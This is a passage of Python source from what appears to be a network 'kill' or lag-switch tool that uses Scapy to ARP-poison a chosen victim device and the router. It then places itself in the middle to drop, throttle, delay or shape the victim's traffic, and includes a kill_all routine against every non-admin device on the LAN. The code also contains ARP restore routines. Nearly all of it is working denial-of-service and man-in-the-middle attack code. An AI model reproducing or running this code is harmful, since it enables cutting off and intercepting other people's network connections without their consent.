                    if hasattr(fw, 'pass_all_live'):
                        fw.pass_all_live()
                    else:
                        fw.drop_from_victim = False
                        fw.drop_to_victim = False
                        fw.pass_from_victim_pct = 100
                        fw.pass_to_victim_pct = 100
                except Exception:
                    pass
                return False
            return True

    def reinforce_full_cut(self, victim, *, rounds=4):
        """
        Post-instant Kill seal: re-poison, reseal 0% hard-drop, retry forwarder,
        and re-disable kernel IP forwarding.

        Never call this before the instant poison/cut path — it is a background
        follow-up for environments where the first hit only feels like lag.
        Does not bump ``_op_seq`` (would cancel the live ARP worker).
        """
        if not isinstance(victim, dict):
            return
        mac = victim.get('mac')
        if not mac or mac not in self.killed:
            return
        rounds = max(1, min(8, int(rounds)))
        seq = int(self._op_seq.get(mac, 0))
        sealed = False
        for i in range(rounds):
            if mac not in self.killed or int(self._op_seq.get(mac, 0)) != seq:
                return
            self.reassert_poison(victim, repeats=4)
            if mac not in self.killed or int(self._op_seq.get(mac, 0)) != seq:
                return
            if not self._seal_hard_drop(mac):
                # Forwarder missing/dead — retry full cut (still post-instant).
                if mac not in self.killed or int(self._op_seq.get(mac, 0)) != seq:
                    return
                self._apply_traffic_cut_sync(victim)
                sealed = self._seal_hard_drop(mac)
            else:
                sealed = True
            disable_ip_forwarding(
                priority_iface=getattr(self.iface, 'name', None),
                priority_only=_lan_kill_priority_only(),
            )
            if i + 1 < rounds:
                sleep(0.05 + (0.05 * i))
        if not sealed:
            try:
                from tools.zubcut_log import app_log

                app_log(
                    'kill_reinforce_unsealed',
                    mac=str(mac),
                    ip=str(victim.get('ip') or ''),
                    rounds=rounds,
                )
            except Exception:
                pass

    def _reinforce_full_cut_async(self, victim) -> None:
        """Schedule ``reinforce_full_cut`` off the Kill click / GUI thread."""
        if not isinstance(victim, dict):
            return
        snap = {
            'mac': victim.get('mac'),
            'ip': victim.get('ip'),
            'vendor': victim.get('vendor'),
        }
        if not snap.get('mac'):
            return
        seq = int(self._op_seq.get(snap['mac'], 0))

        def _work() -> None:
            try:
                # Yield so the instant arm returns / UI paints first.
                sleep(0.02)
                mac = snap.get('mac')
                if not mac or mac not in self.killed:
                    return
                if int(self._op_seq.get(mac, 0)) != int(seq):
                    return
                live = self.killed.get(mac) or snap
                self.reinforce_full_cut(live if isinstance(live, dict) else snap)
            except Exception:
                try:
                    from tools.zubcut_log import app_log

                    app_log(
                        'kill_reinforce_failed',
                        mac=str(snap.get('mac') or ''),
                        ip=str(snap.get('ip') or ''),
                        exc_info=True,
                    )
                except Exception:
                    pass

        try:
            threading.Thread(
                target=safe_daemon_target(_work),
                name='zubcut-kill-full-cut',
                daemon=True,
            ).start()
        except Exception:
            pass

    def _poison_frames(self, victim):
        """Unicast ARP poison, plus Wi‑Fi victim-targeted broadcast when isolation drops STA unicast.

        Send both ARP *request* (op=1) and *reply* (op=2) unicast to the
        victim and router. Many stacks ignore unsolicited unicast replies but
        still cache the sender mapping from a request — reply-only poison was
        too weak after broadcast removal.

        On Wi‑Fi, AP client isolation often drops STA-to-STA *unicast*, so the
        ethernet PS5 never sees those frames and Kill does nothing. Add
        victim-targeted L2 broadcast copies (pdst/hwdst still this victim only
        — not a GARP). This PC staying online is not proof those copies are
        safe for every LAN; they are how poison reaches this console.
        """
        src = self._poison_hwsrc()
        # Victim: "router is at PC MAC"
        to_victim_req = Ether(src=src, dst=victim['mac']) / ARP(
            op=1,
            psrc=self.router['ip'],
            hwsrc=src,
            pdst=victim['ip'],
            hwdst=victim['mac'],
        )
        to_victim_reply = Ether(src=src, dst=victim['mac']) / ARP(
            op=2,
            psrc=self.router['ip'],
            hwsrc=src,
            pdst=victim['ip'],
            hwdst=victim['mac'],
        )
        # Router: "victim is at PC MAC"
        to_router_req = Ether(src=src, dst=self.router['mac']) / ARP(
            op=1,
            psrc=victim['ip'],
            hwsrc=src,
            pdst=self.router['ip'],
            hwdst=self.router['mac'],
        )
        to_router_reply = Ether(src=src, dst=self.router['mac']) / ARP(
            op=2,
            psrc=victim['ip'],
            hwsrc=src,
            pdst=self.router['ip'],
            hwdst=self.router['mac'],
        )
        # Router ARP recovers faster from direct victim frames — send router-side
        # poison twice per burst so inbound MITM (full Kill) holds with outbound.
        frames = [
            to_victim_req,
            to_victim_reply,
            to_router_req,
            to_router_reply,
            to_router_req,
            to_router_reply,
        ]
        try:
            from tools.mitm_probe import iface_is_wireless

            wifi = iface_is_wireless(self.iface)
        except Exception:
            wifi = False
        if wifi:
            bcast = 'ff:ff:ff:ff:ff:ff'
            frames.extend(
                [
                    Ether(src=src, dst=bcast)
                    / ARP(
                        op=1,
                        psrc=self.router['ip'],
                        hwsrc=src,
                        pdst=victim['ip'],
                        hwdst=victim['mac'],
                    ),
                    Ether(src=src, dst=bcast)
                    / ARP(
                        op=2,
                        psrc=self.router['ip'],
                        hwsrc=src,
                        pdst=victim['ip'],
                        hwdst=victim['mac'],
                    ),
                ]
            )
        return frames

    def _poison_arp_now(self, victim, seq=0, repeats=1, delay_s=0.0):
        """Best-effort immediate ARP poison burst; aborts if a newer op supersedes this sequence.

        Designed for the GUI thread — uses ONLY the cached L2 socket. If the
        cache is cold (prewarm hasn't finished, or _close_socket was called),
        we skip the burst and let the threaded ARP worker open the socket off
        the GUI thread. Opening conf.L2socket() on Windows costs 0.5–2 s and
        would freeze the UI between button-press and row-highlight.
        """
        if self.iface.name == 'NULL':
            return
        sock = self._socket
        if sock is None:
            # Cold Npcap socket: race a short blocking prewarm so poison can go sync.
            if self.prewarm_l2_socket(join_ms=120):
                sock = self._socket
        if sock is None:
            # Still cold — background burst + socket warm for the ARP worker.
            self._poison_arp_now_async(victim, seq, repeats, delay_s)
            return
        frames = self._poison_frames(victim)

        for _ in range(max(1, int(repeats))):
            if self._op_seq.get(victim['mac']) != seq or victim['mac'] not in self.killed:
                break
            try:
                with self._socket_lock:
                    for frame in frames:
                        if (
                            self._op_seq.get(victim['mac']) != seq
                            or victim['mac'] not in self.killed
                        ):
                            return
                        sock.send(frame)
            except Exception:
                # Socket died mid-burst — let the threaded worker recover.
                with self._socket_lock:
                    self._socket = None
                return
            if delay_s > 0:
                sleep(delay_s)

    def _poison_arp_now_async(self, victim, seq=0, repeats=1, delay_s=0.0):
        """Background poison burst when the cached L2 socket is cold."""

        def _work():
            try:
                from scapy.all import sendp

                tokens = self._iface_l2_tokens()
                if not tokens:
                    return
                frames = self._poison_frames(victim)
                for _ in range(max(1, int(repeats))):
                    if self._op_seq.get(victim['mac']) != seq or victim['mac'] not in self.killed:
                        break
                    sent = False
                    for tok in tokens:
                        try:
                            for frame in frames:
                                if (
                                    self._op_seq.get(victim['mac']) != seq
                                    or victim['mac'] not in self.killed
                                ):
                                    return
                                sendp(frame, iface=tok, verbose=0)
                            sent = True
                            break
                        except Exception:
                            continue
                    if not sent:
                        break
                    if delay_s > 0:
                        sleep(delay_s)
                # Warm the persistent socket for the worker loop.
                self._get_socket()
            except Exception:
                pass

        try:
            threading.Thread(
                target=safe_daemon_target(_work),
                name='zubcut-poison-burst',
                daemon=True,
            ).start()
        except Exception:
            pass

    def apply_percent_cut(self, victim, pass_percent=100, debug=False, *, arm_if_needed=True):
        """
        Keep MITM active and forward only a percentage of packets (both directions).

        ``arm_if_needed=False`` (Kill/Dupe cut + reinforce): never call ``kill()``
        if OFF already cleared ``killed``. That re-arm is the restore-then-recut hole.
        Percent Cut ON keeps the default so a 100% cut can still start MITM.
        """
        mac = victim.get('mac') if isinstance(victim, dict) else None
        if not mac:
            return False
        pass_percent = max(0, min(100, int(pass_percent)))
        if mac not in self.killed:
            if not arm_if_needed:
                return False
            # 0.0: Percent Cut ON must feel instant (Lag/Kill preblock parity).
            self.kill(victim, wait_after=0.0, traffic_cut=False)
        else:
            # Reuse a live hard-drop forwarder — stop+restart races Dupe/Kill OFF
            # (Npcap close vs new AsyncSniffer) and can freeze the GUI.
            if pass_percent <= 0 and self._seal_hard_drop(mac):
                return True
            if mac not in self.killed:
                return False
            self._stop_forwarder(mac)
        if pass_percent <= 0 and mac not in self.killed and not arm_if_needed:
            return False
        pass_from_victim = pass_percent
        pass_to_victim = pass_percent

        if not self.router.get('mac'):
            return False
        tokens = npcap_iface_tokens(self.iface)
        if not tokens:
            return False
        self._get_socket()
        # Full Kill (0%): hard-drop both directions in addition to pass ratio.
        hard_drop = pass_percent <= 0
        fw = MitmForwarder(debug=debug)
        fw.start(
            victim=victim,
            router=self.router,
            iface_name=tokens[0],
            iface_mac=self.iface.mac,
            drop_from_victim=hard_drop,
            drop_to_victim=hard_drop,
            pass_from_victim_pct=pass_from_victim,
            pass_to_victim_pct=pass_to_victim,
            iface_alts=tokens[1:],
        )
        if pass_percent <= 0 and mac not in self.killed and not arm_if_needed:
            try:
                fw.stop()
            except Exception:
                pass
            return False
        self.forwarders[mac] = fw
        if not (fw and getattr(fw, 'running', False)):
            self.forwarders.pop(mac, None)
            return False
        if pass_percent <= 0 and mac not in self.killed and not arm_if_needed:
            # OFF won after we built a hard-drop sniffer. Keep it as pass-through
            # — stopping leaves leftover poison with no relay (red chain returns).
            self.resume_percent_cut_live(mac)
            return False
        # Seal kernel relay after the forwarder is live — never before the cut.
        disable_ip_forwarding(
            priority_iface=getattr(self.iface, 'name', None),
            priority_only=_lan_kill_priority_only(),
        )
        return True

    def disable_percent_cut(self, mac):
        self._stop_forwarder(mac)

    def resume_percent_cut_live(self, mac) -> bool:
        """Set forwarder to 100% pass without stopping Npcap (instant OFF feel)."""
        with self._cut_gate():
            return self._resume_percent_cut_live_unlocked(mac)

    def _resume_percent_cut_live_unlocked(self, mac) -> bool:
        mac = str(mac or '').strip()
        if not mac:
            return False
        fw = self.forwarders.get(mac)
        if fw is None or not getattr(fw, 'running', False):
            return False
        try:
            if hasattr(fw, 'pass_all_live'):
                fw.pass_all_live()
            else:
                fw.pass_from_victim_pct = 100
                fw.pass_to_victim_pct = 100
                fw.drop_from_victim = False
                fw.drop_to_victim = False
            return True
        except Exception:
            return False

    def _cancel_restore_pass(self, mac) -> None:
        try:
            (self._restore_pass_until or {}).pop(mac, None)
        except Exception:
            pass
        try:
            if isinstance(getattr(self, '_restore_pass_gen', None), dict):
                self._restore_pass_gen[mac] = int(self._restore_pass_gen.get(mac, 0)) + 1
        except Exception:
            pass

    def _restore_pass_seen(self, mac) -> int:
        fw = (getattr(self, 'forwarders', None) or {}).get(mac)
        if fw is None:
            return 0
        try:
            stats = fw.get_stats() if hasattr(fw, 'get_stats') else None
            if isinstance(stats, dict):
                return int(stats.get('packets_seen') or 0) + int(
                    stats.get('packets_forwarded') or 0
                )
        except Exception:
            pass
        try:
            return int(getattr(fw, '_pkt_count', 0) or 0) + int(
                getattr(fw, '_fwd_count', 0) or 0
            )
        except Exception:
            return 0

    def _arm_restore_pass_stop(self, mac, seq, extra_macs=None) -> None:
        """Do not call from LAN Kill/Dupe OFF — stopping this relay recuts.

        Home LAN OFF must use ``_hold_restore_pass`` until the next ON.
        Auto-stop is the restore-then-red-chain hole on mesh + ethernet PS5.
        """
        if not mac:
            return
        extras = []
        seen_m = {str(mac)}
        for raw in extra_macs or []:
            key = str(raw or '').strip()
            if not key or key in seen_m:
                continue
            seen_m.add(key)
            extras.append(key)
        if not isinstance(getattr(self, '_restore_pass_until', None), dict):
            self._restore_pass_until = {}
        if not isinstance(getattr(self, '_restore_pass_gen', None), dict):
            self._restore_pass_gen = {}
        gen = int(self._restore_pass_gen.get(mac, 0)) + 1
        self._restore_pass_gen[mac] = gen
        started = monotonic()
        self._restore_pass_until[mac] = started + _RESTORE_PASS_MIN_S

        def _still_ours() -> bool:
            if self._op_seq.get(mac) != seq or mac in self.killed:
                return False
            return int((getattr(self, '_restore_pass_gen', None) or {}).get(mac, 0)) == gen

        def _slide_until(deadline: float) -> None:
            try:
                self._restore_pass_until[mac] = float(deadline)
            except Exception:
                pass

        def _work() -> None:
            last_seen = self._restore_pass_seen(mac)
            quiet_since = None
            while _still_ours():
                now = monotonic()
                fw = (getattr(self, 'forwarders', None) or {}).get(mac)
                if fw is None or not getattr(fw, 'running', False):
                    if now - started < 5.0:
                        sleep(0.25)
                        continue
                    break
                if not _forwarder_is_pass_all(fw):
                    # In-flight Kill seal can flip hard-drop after OFF. Stopping
                    # the relay here is the restore-then-red-chain hole. Flip
                    # back to 100% pass and keep holding.
                    if mac in self.killed:
                        return
                    self.resume_percent_cut_live(mac)
                    sleep(0.25)
                    continue
                seen = self._restore_pass_seen(mac)
                if seen != last_seen:
                    last_seen = seen
                    quiet_since = None
                    # Still in use — never let idle reconcile drop this relay.
                    _slide_until(now + _RESTORE_PASS_BUSY_SLIDE_S)
                else:
                    if quiet_since is None:
                        quiet_since = now
                    held = now - started
                    quiet_for = now - quiet_since
                    if held < _RESTORE_PASS_MIN_S:
                        _slide_until(started + _RESTORE_PASS_MIN_S)
                    elif quiet_for >= _RESTORE_PASS_QUIET_S:
                        break
                    else:
                        _slide_until(now + _RESTORE_PASS_QUIET_S)
                sleep(1.0)
            if not _still_ours():
                return
            try:
                (self._restore_pass_until or {}).pop(mac, None)
            except Exception:
                pass
            if mac not in self.killed:
                self._stop_restore_pass_forwarders(mac, extras)

        try:
            threading.Thread(
                target=safe_daemon_target(_work),
                name='zubcut-restore-pass-stop',
                daemon=True,
            ).start()
        except Exception:
            pass

    def _start_restore_pass_forwarder(self, victim) -> bool:
        """Start a 100% pass forwarder without re-arming Kill / ``killed``."""
        if not isinstance(victim, dict):
            return False
        mac = victim.get('mac')
        if not mac or mac in self.killed:
            return False
        if self.resume_percent_cut_live(mac):
            return True
        router_ip, router_mac = self._restore_router_endpoint()
        if not router_ip or not mac_address_is_usable(router_mac):
            return False
        if not mac_address_is_usable(victim.get('mac')):
            return False
        tokens = npcap_iface_tokens(self.iface)
        if not tokens:
            return False
        fw = MitmForwarder()
        fw.start(
            victim=victim,
            router={'ip': router_ip, 'mac': router_mac},
            iface_name=tokens[0],
            iface_mac=self.iface.mac,
            drop_from_victim=False,
            drop_to_victim=False,
            pass_from_victim_pct=100,
            pass_to_victim_pct=100,
            iface_alts=tokens[1:],
        )
        self.forwarders[mac] = fw
        if not getattr(fw, 'running', False):
            self.forwarders.pop(mac, None)
            return False
        return True

    def _stop_restore_pass_forwarders(self, mac, extra_macs=None) -> None:
        self._stop_forwarder(mac)
        for key in extra_macs or []:
            if key and key not in self.killed:
                self._stop_forwarder(key)

    def _hold_restore_pass(self, mac) -> None:
        """Keep leftover MITM in 100% pass until the next Kill/Dupe ON.

        Auto-stopping this relay recuts the ethernet PS5 (restore then red
        chain). Native-skip in the forwarder is what avoids leftover lag.
        """
        if not mac:
            return
        if not isinstance(getattr(self, '_restore_pass_until', None), dict):
            self._restore_pass_until = {}
        self._restore_pass_until[mac] = monotonic() + (24.0 * 3600.0)
        # Cancel any quiet-stop worker so it cannot tear the relay down.
        try:
            if not isinstance(getattr(self, '_restore_pass_gen', None), dict):
                self._restore_pass_gen = {}
            self._restore_pass_gen[mac] = int(self._restore_pass_gen.get(mac, 0)) + 1
        except Exception:
            pass

    def _ensure_restore_pass(self, victim, seq, *, extra_macs=None) -> None:
        """Flip leftover MITM to 100% pass so OFF is not a black hole."""
        mac = str((victim or {}).get('mac') or '') if isinstance(victim, dict) else ''
        if not mac or mac in self.killed:
            return
        extra = [m for m in (extra_macs or []) if m and m != mac]
        if self.resume_percent_cut_live(mac):
            self._hold_restore_pass(mac)
            for m in extra:
                self.resume_percent_cut_live(m)
            self._reassert_restore_pass(mac, seq, extra)
            return
        snap = {
            'mac': (victim or {}).get('mac'),
            'ip': (victim or {}).get('ip'),
            'vendor': (victim or {}).get('vendor'),
        }

        def _work() -> None:
            if self._op_seq.get(mac) != seq or mac in self.killed:
                return
            if self.resume_percent_cut_live(mac):
                self._hold_restore_pass(mac)
                self._reassert_restore_pass(mac, seq, extra)
                return
            if self._start_restore_pass_forwarder(snap):
                self._hold_restore_pass(mac)
                self._reassert_restore_pass(mac, seq, extra)

        try:
            threading.Thread(
                target=safe_daemon_target(_work),
                name='zubcut-restore-pass',
                daemon=True,
            ).start()
        except Exception:
            pass

    def _reassert_restore_pass(self, mac, seq, extra_macs=None) -> None:
        """Beat in-flight reinforce/probe that reseals hard-drop after OFF."""
        mac = str(mac or '').strip()
        if not mac:
            return
        macs = []
        seen = set()
        for m in [mac] + list(extra_macs or []):
            s = str(m or '').strip()
            if not s or s in seen:
                continue
            seen.add(s)
            macs.append(s)

        def _work() -> None:
            for delay_s in (0.05, 0.25, 1.35, 3.0):
                sleep(delay_s)
                if int(self._op_seq.get(mac, 0) or 0) != int(seq) or mac in self.killed:
                    return
                for m in macs:
                    if m in self.killed:
                        return
                    self.resume_percent_cut_live(m)

        try:
            threading.Thread(
                target=safe_daemon_target(_work),
                name='zubcut-restore-pass-hold',
                daemon=True,
            ).start()
        except Exception:
            pass

    def _unblock_victim_firewall(self, victim) -> None:
        """Drop Kill's Windows Firewall / pf block immediately (do not wait on restore)."""
        ip = str((victim or {}).get('ip') or '').strip() if isinstance(victim, dict) else ''
        if not ip:
            return
        try:
            self._remove_pf_block(ip)
        except Exception:
            pass

        def _work():
            try:
                from tools.pfctl import firewall_generation_bump, unblock_ip

                firewall_generation_bump(ip)
                unblock_ip(ip)
            except Exception:
                pass

        try:
            threading.Thread(
                target=safe_daemon_target(_work),
                daemon=True,
                name='zubcut-unkill-fw',
            ).start()
        except Exception:
            _work()

    def apply_link_shaping(
        self,
        victim,
        *,
        delay_ms_out=0,
        delay_ms_in=0,
        jitter_ms_out=0,
        jitter_ms_in=0,
        loss_pct_out=0,
        loss_pct_in=0,
        max_kbps_out=0.0,
        max_kbps_in=0.0,
        debug=False,
    ):
        """
        Forwarder with per-direction delay, optional jitter, loss %, and token-bucket caps.
        """
        if victim['mac'] not in self.killed:
            self.kill(victim, wait_after=0.08, traffic_cut=False)
        delay_ms_out = max(0, min(_MAX_DELAY_MS, int(delay_ms_out)))
        delay_ms_in = max(0, min(_MAX_DELAY_MS, int(delay_ms_in)))
        jitter_ms_out = max(0, min(_MAX_DELAY_MS, int(jitter_ms_out)))
        jitter_ms_in = max(0, min(_MAX_DELAY_MS, int(jitter_ms_in)))
        loss_pct_out = max(0, min(100, int(loss_pct_out)))
        loss_pct_in = max(0, min(100, int(loss_pct_in)))
        max_kbps_out = max(0.0, min(_MAX_SHAPING_KBPS, float(max_kbps_out)))
        max_kbps_in = max(0.0, min(_MAX_SHAPING_KBPS, float(max_kbps_in)))
        if victim['mac'] in self.forwarders:
            self.forwarders[victim['mac']].stop()
        if not self.router.get('mac'):
            return
        tokens = npcap_iface_tokens(self.iface)
        if not tokens:
            return
        self._get_socket()
        fw = MitmForwarder(debug=debug)
        fw.start(
            victim=victim,
            router=self.router,
            iface_name=tokens[0],
            iface_mac=self.iface.mac,
            drop_from_victim=False,
            drop_to_victim=False,
            pass_from_victim_pct=100,
            pass_to_victim_pct=100,
            delay_ms_from_victim=delay_ms_out,
            delay_ms_to_victim=delay_ms_in,
            jitter_ms_from_victim=jitter_ms_out,
            jitter_ms_to_victim=jitter_ms_in,
            loss_pct_from_victim=loss_pct_out,
            loss_pct_to_victim=loss_pct_in,
            max_kbps_from_victim=max_kbps_out,
            max_kbps_to_victim=max_kbps_in,
            iface_alts=tokens[1:],
        )
        self.forwarders[victim['mac']] = fw
        disable_ip_forwarding(
            priority_iface=getattr(self.iface, 'name', None),
            priority_only=_lan_kill_priority_only(),
        )

    @threaded
    def _kill_arp_worker(self, victim, wait_after=2, seq=0, *, aggressive=False):
        frames = self._poison_frames(victim)

        # Front-load short-interval reasserts so a missed first poison still sticks.
        # Kill (traffic_cut) uses a denser warmup; Lag/PctCut keep the lighter cadence.
        if aggressive:
            warmup_remaining = 8
            warmup_gap = 0.05
        else:
            warmup_remaining = 4
            warmup_gap = 0.08
        while (
            victim['mac'] in self.killed
            and self.iface.name != 'NULL'
            and self._op_seq.get(victim['mac']) == seq
        ):
            for frame in frames:
                if (
                    victim['mac'] not in self.killed
                    or self.iface.name == 'NULL'
                    or self._op_seq.get(victim['mac']) != seq
                ):
                    return
                self._send_packet(frame)
            if warmup_remaining > 0:
                warmup_remaining -= 1
                sleep(warmup_gap)
                continue
            # Sleep in short slices so OFF takes effect quickly (avoid UI/backend desync feel).
            total_wait = max(0.05, float(wait_after))
            slept = 0.0
            step = 0.05
            while slept < total_wait:
                if (
                    victim['mac'] not in self.killed
                    or self.iface.name == 'NULL'
                    or self._op_seq.get(victim['mac']) != seq
                ):
                    break
                sleep(step)
                slept += step

        # Do not stop the forwarder here. OFF flips it to 100% pass; stopping
        # while ARP is still poisoned black-holes WAN (Analysis AFTER then
        # false-passes on LAN ping + "forwarder cleared").

    def unkill(self, victim, *, ics_mode=False):
        """
        Unspoofing victim.

        Removes from ``self.killed`` on the caller thread before ARP restore runs
        in the background, so the UI does not race with _sync_killed_devices().
        LAN OFF keeps a 100% pass-through until ARP expires — stopping the
        dropper immediately leaves leftover MITM with forwarding off.
        """
        self._sync_iface_for_victim(victim, refresh_router=not ics_mode)
        mac = victim['mac']
        alias_keys = self._killed_keys_for_victim(victim)
        seq = 0
        with self._cut_gate():
            seen = set()
            for key in list(alias_keys) + [mac]:
                if not key or key in seen:
                    continue
                seen.add(key)
                seq = self._next_op_seq(key)
                self.killed.pop(key, None)
            if not seq:
                seq = self._next_op_seq(mac)
            relays = getattr(self, '_unkill_relays', None)
            if isinstance(relays, set):
                for key in seen:
                    relays.discard(key)
            if not ics_mode:
                for key in seen:
                    self._resume_percent_cut_live_unlocked(key)
        self._unblock_victim_firewall(victim)
        if ics_mode:
            self._cancel_restore_pass(mac)
            self._stop_forwarder(mac)
            for key in alias_keys:
                if key != mac:
                    self._stop_forwarder(key)
        else:
            self._ensure_restore_pass(victim, seq, extra_macs=alias_keys)
            self._pin_local_gateway_neighbor_async()
        # Never send restore ARP or open Npcap on this thread — Wi‑Fi L2 send
        # and conf.L2socket block the UI. The worker's first burst is immediate.
        if not self.l2_socket_ready():
            self.prewarm_l2_socket(join_ms=0)
        self._unkill_restore_worker(victim, seq, quick=ics_mode)

    def reinforce_restore(self, victim, *, ics_mode=False):
        """
        Extra best-effort restore packets for a victim that should already be OFF.
        Safe no-op when victim is currently killed again.
        Must not send or rebind on the caller thread (Kill OFF GUI path).
        """
        mac = victim.get('mac') if isinstance(victim, dict) else None
        if not mac:
            return
        if mac in self.killed:
            return
        seq = self._op_seq.get(mac, 0)
        if not self.l2_socket_ready():
            self.prewarm_l2_socket(join_ms=0)
        self._restore_arp_now_async(victim, seq, repeats=2, unicast_only=True)

    def _restore_frames(self, victim, *, unicast_only=False):
        """Undo poison with the same delivery Kill/Dupe ON used.

        This PC is on mesh Wi‑Fi; the PS5 is on router ethernet. Isolation
        drops STA unicast, which is why ON uses victim-targeted L2 broadcast.
        Unicast-only restore never reaches that console.

        Poison broadcast is consistent (Ether src == hwsrc == this PC). A
        restore broadcast that keeps this PC as Ether src and the router as
        hwsrc is the shape many stacks ignore. Also flood the honest pair
        (Ether src == hwsrc == router MAC) on the same broadcast path.

        Do not broadcast ``psrc=victim_ip`` from this PC — that re-teaches
        the router the PS5 is here.

        ``unicast_only``: later OFF follow-up for Wi‑Fi PC + Wi‑Fi PS5 on
        the same AP. Trailing poison recuts after the short burst; STA
        unicast restore lands there. Do not include broadcasts or
        router-SA spoofs — those overwrite a wired PS5 on Starlink.
        """
        src = self._poison_hwsrc()
        router_ip, router_mac = self._restore_router_endpoint()
        victim_ip = str((victim or {}).get('ip') or '').strip()
        victim_mac = good_mac((victim or {}).get('mac') or '')
        if not victim_ip or not mac_address_is_usable(victim_mac):
            return []
        if not router_ip or not mac_address_is_usable(router_mac):
            return []
        to_victim_req = Ether(src=src, dst=victim_mac) / ARP(
            op=1,
            psrc=router_ip,
            hwsrc=router_mac,
            pdst=victim_ip,
            hwdst=victim_mac,
        )
        to_victim_reply = Ether(src=src, dst=victim_mac) / ARP(
            op=2,
            psrc=router_ip,
            hwsrc=router_mac,
            pdst=victim_ip,
            hwdst=victim_mac,
        )
        to_router_req = Ether(src=src, dst=router_mac) / ARP(
            op=1,
            psrc=victim_ip,
            hwsrc=victim_mac,
            pdst=router_ip,
            hwdst=router_mac,
        )
        to_router_reply = Ether(src=src, dst=router_mac) / ARP(
            op=2,
            psrc=victim_ip,
            hwsrc=victim_mac,
            pdst=router_ip,
            hwdst=router_mac,
        )
        as_router_req = Ether(src=router_mac, dst=victim_mac) / ARP(
            op=1,
            psrc=router_ip,
            hwsrc=router_mac,
            pdst=victim_ip,
            hwdst=victim_mac,
        )
        as_router_reply = Ether(src=router_mac, dst=victim_mac) / ARP(
            op=2,
            psrc=router_ip,
            hwsrc=router_mac,
            pdst=victim_ip,
            hwdst=victim_mac,
        )
        if unicast_only:
            return [
                to_victim_req,
                to_victim_reply,
                to_victim_req,
                to_victim_reply,
                to_router_req,
                to_router_reply,
                to_router_req,
                to_router_reply,
            ]
        frames = [
            to_victim_req,
            to_victim_reply,
            to_router_req,
            to_router_reply,
            to_router_req,
            to_router_reply,
            as_router_req,
            as_router_reply,
        ]
        try:
            from tools.mitm_probe import iface_is_wireless

            wifi = iface_is_wireless(self.iface)
        except Exception:
            wifi = False
        if wifi:
            bcast = 'ff:ff:ff:ff:ff:ff'
            frames.extend(
                [
                    Ether(src=src, dst=bcast)
                    / ARP(
                        op=1,
                        psrc=router_ip,
                        hwsrc=router_mac,
                        pdst=victim_ip,
                        hwdst=victim_mac,
                    ),
                    Ether(src=src, dst=bcast)
                    / ARP(
                        op=2,
                        psrc=router_ip,
                        hwsrc=router_mac,
                        pdst=victim_ip,
                        hwdst=victim_mac,
                    ),
                    Ether(src=router_mac, dst=bcast)
                    / ARP(
                        op=1,
                        psrc=router_ip,
                        hwsrc=router_mac,
                        pdst=victim_ip,
                        hwdst=victim_mac,
                    ),
                    Ether(src=router_mac, dst=bcast)
                    / ARP(
                        op=2,
                        psrc=router_ip,
                        hwsrc=router_mac,
                        pdst=victim_ip,
                        hwdst=victim_mac,
                    ),
                ]
            )
        return frames

    def _restore_arp_now_async(self, victim, seq=0, repeats=1, *, unicast_only=False):
        """Background restore burst — never open Npcap / sendp on the GUI thread."""
        if not isinstance(victim, dict):
            return
        snap = {
            'mac': victim.get('mac'),
            'ip': victim.get('ip'),
            'vendor': victim.get('vendor'),
        }

        def _work() -> None:
            if int(self._op_seq.get(snap.get('mac'), 0) or 0) != int(seq):
                return
            if snap.get('mac') in self.killed:
                return
            if not self.l2_socket_ready():
                self._get_socket()
            self._restore_arp_now(
                snap,
                seq,
                repeats=repeats,
                delay_s=0,
                unicast_only=unicast_only,
                allow_async=False,
            )

        try:
            threading.Thread(
                target=safe_daemon_target(_work),
                name='zubcut-restore-arp',
                daemon=True,
            ).start()
        except Exception:
            pass

    def _restore_arp_now(
        self,
        victim,
        seq=0,
        repeats=1,
        delay_s=0.1,
        *,
        unicast_only=False,
        allow_async=True,
    ):
        """Best-effort ARP restore; aborts if a newer op supersedes this sequence.

        Uses only the cached L2 socket. Opening Npcap here freezes the UI.
        """
        if self.iface.name == 'NULL':
            return
        mac = str((victim or {}).get('mac') or '')
        if not mac:
            return
        sock = self._socket
        if sock is None or not self.l2_socket_ready():
            if allow_async:
                self._restore_arp_now_async(
                    victim, seq, repeats=repeats, unicast_only=unicast_only
                )
            return
        frames = self._restore_frames(victim, unicast_only=unicast_only)
        if not frames:
            return
        for _ in range(max(1, int(repeats))):
            if self._op_seq.get(mac) != seq or mac in self.killed:
                break
            try:
                with self._socket_lock:
                    for frame in frames:
                        if self._op_seq.get(mac) != seq or mac in self.killed:
                            return
                        sock.send(frame)
            except Exception:
                with self._socket_lock:
                    self._socket = None
                if allow_async:
                    self._restore_arp_now_async(
                        victim, seq, repeats=repeats, unicast_only=unicast_only
                    )
                return
            if delay_s > 0:
                sleep(delay_s)

    @threaded
    def _unkill_restore_worker(self, victim, seq=0, *, quick=False):
        # Follow-up restore bursts so late poison frames do not re-break connectivity.
        # ICS hotspot uses a short plan — PS5 should recover in under ~300ms, not ~2s.
        if not self.l2_socket_ready():
            self._get_socket()
        if quick:
            plan = (
                (0.0, 2, False),
                (0.08, 1, False),
            )
        else:
            # Short honest burst (including Wi‑Fi broadcast / router-SA) so an
            # isolated ethernet PS5 still hears OFF. Then unicast-only follow-up:
            # same-AP Wi‑Fi PS5 needs that against trailing poison; a wired
            # Starlink PS5 does not hear STA unicast, so we do not overwrite it.
            plan = (
                (0.0, 3, False),
                (0.2, 2, False),
                (0.45, 2, False),
                (1.0, 2, True),
                (2.5, 2, True),
                (5.0, 2, True),
            )
        for wait_s, repeats, unicast_only in plan:
            if self._op_seq.get(victim['mac']) != seq or victim['mac'] in self.killed:
                return
            if wait_s > 0:
                sleep(wait_s)
            if self._op_seq.get(victim['mac']) != seq or victim['mac'] in self.killed:
                return
            self._restore_arp_now(
                victim,
                seq,
                repeats=repeats,
                delay_s=0,
                unicast_only=unicast_only,
                allow_async=False,
            )
        if self._op_seq.get(victim['mac']) == seq and victim['mac'] not in self.killed:
            self._remove_pf_block(victim['ip'])

    def kill_all(self, device_list):
        """
        Safely kill all devices
        """
        for device in device_list[:]:
            if device['admin']:
                continue
            if device['mac'] not in self.killed:
                self._sync_iface_for_victim(device)
                self.kill(device)

    def unkill_all(self, scanner=None):
        """
        Safely unkill all devices killed previously
        """
        try:
            from tools.clumsy_inline import (
                apply_clumsy_ics_router_context,
                heal_ics_client_after_mitm,
                victim_on_clumsy_ics_subnet,
            )
        except Exception:
            apply_clumsy_ics_router_context = None
            heal_ics_client_after_mitm = None
            victim_on_clumsy_ics_subnet = lambda _ip: False

        victims = list(self.killed.values())
        for victim in victims:
            ip = str((victim or {}).get('ip') or '').strip()
